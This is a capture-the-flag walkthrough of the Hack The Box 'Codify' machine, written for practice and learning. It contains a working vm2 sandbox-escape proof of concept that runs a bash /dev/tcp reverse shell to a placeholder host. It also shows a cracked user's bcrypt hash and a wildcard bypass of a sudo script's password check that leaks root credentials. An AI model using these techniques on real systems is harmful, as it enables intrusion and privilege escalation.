---
title: HTB Codify Writeup
date: 2023-11-24 04:15:16 +0600
categories: [Linux, Easy]
tags: [htb] 
toc: true    
---

![Codify Pwned](https://raw.githubusercontent.com/ImdadMiran17/ImdadMiran17.github.io/main/assets/img/codify-htb/codify_pwned.png "Pwned haha!!")

# Introduction
What's up!! Red Teamers. In this post we will try to solve the linux machine **Codify**. It is rated as easy and the machine is from **Open Beta Season III**. 

# Enumeration
Starting with the nmap scan...... 

```bash
sudo nmap -sS -T4 -n -v -A 10.10.11.239 > nmap_discovered_ports
```

What do we have here??

```bash
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http        Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://codify.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
3000/tcp open  http        Node.js Express framework
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Codify
8080/tcp open  http-proxy?
```

The IP redirects to `http://codify.htb/`. So we need to add the IP and hostname in the hosts file. For linux, it's `/etc/hosts` and for windows, it's `c:\Windows\System32\Drivers\etc\hosts`.

Then we get ...

![Home Page](https://raw.githubusercontent.com/ImdadMiran17/ImdadMiran17.github.io/main/assets/img/codify-htb/home_page.PNG)

It says it's a simple web application that allows you to test your Node.js code easily. There is also a about page if you notice. From about page we got something interesting.

![About Page](https://raw.githubusercontent.com/ImdadMiran17/ImdadMiran17.github.io/main/assets/img/codify-htb/codify_about.PNG)

We found the library that was used to build this sandbox. It says The `vm2` library is widely used and trusted tool for sandboxing javascript. Just hold onto that, will you?

And... last but not least, the code editor.

![Code Editor](https://raw.githubusercontent.com/ImdadMiran17/ImdadMiran17.github.io/main/assets/img/codify-htb/editor.PNG)

# Foothold 

Remember that `vm2` library?? If you do some googling, I'm sure you will bump into these resources from [Github](https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244) and [Snyk](https://security.snyk.io/vuln/SNYK-JS-VM2-5537100).

Now use the POC javascript code to get a reverse shell. You can generate reverse shells in here [revshells](https://www.revshells.com/).

```javascript
const { VM } = require("vm2");
const vm = new VM();

const code = `
  const err = new Error();
  err.name = {
    toString: new Proxy(() => "", {
      apply(target, thiz, args) {
        const process = args.constructor.constructor("return process")();
        throw process.mainModule.require("child_process").execSync("bash -i >& /dev/tcp/IP/PORT 0>&1").toString();
      },
    }),
  };
  try {
    err.stack;
  } catch (stdout) {
    stdout;
  }
`;

console.log(vm.run(code));
```

You'll get the shell in no time.

# Lateral Movement
Now that you're in as `www-data`, first stabilize the shell. 

```Bash
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
ctrl+z(bg)
$ stty raw -echo;fg
$ export TERM = xterm
```
As we are in as `www-data`, we should see what we have in the web server. A sqlite db file was found in `/var/www/` directory. And we found a credential of a user named 'joshua'.

```plaintext
joshua:$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
```

It's a bcrypt hash. We can use either `hashcat` or `john` to crack this. It won't take long whichever you use. Upon cracking the password, you can use the password to login as `joshua` via ssh.

![Got joshua](https://raw.githubusercontent.com/ImdadMiran17/ImdadMiran17.github.io/main/assets/img/codify-htb/joshua.png)

Now you have the user flag.

# Priviledge Escalation 

Run the command `sudo -l`...

![permissions](https://raw.githubusercontent.com/ImdadMiran17/ImdadMiran17.github.io/main/assets/img/codify-htb/sudo-l.png)

You can run `/opt/scripts/mysql-backup.sh` as root. Let's see the code here.

![mysql_backup.sh](https://raw.githubusercontent.com/ImdadMiran17/ImdadMiran17.github.io/main/assets/img/codify-htb/mysql_backup_sh.png)

It takes an input password for root and compares them with `.creds` in `root` directory. Then it has mysql commands to backup databases. Kinda strange that it uses password in the command as plaintext. To get to that, we have to bypass the validation first. Do you know the comparison operations of bash?


You can read briefly [here](https://tldp.org/LDP/abs/html/comparison-ops.html).

To be exact , if double brackets are used in string comparison, you can use regex or pattern matching there. And in the script, double brackets are used. So if you put `*` as input, it will be a correct password cuz `*` matches everything including the required password.



And the script runs. But how can we see the password from those mysql commands for backing up the database? Well, we can use [pspy](https://github.com/DominicBreuker/pspy). 

It says "*pspy is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. Great for enumeration of Linux systems in CTFs. Also great to demonstrate your colleagues why passing secrets as arguments on the command line is a bad idea*".

So login to ssh with another terminal. Then run pspy in one terminal and the script in other as sudo. You'll see the password in no time. You may have to run the script multiple times.


Now that you have the password, let's try to login as root. Annnnd, voila, we are root. You know where is the root flag.


#### Happy Hacking :)





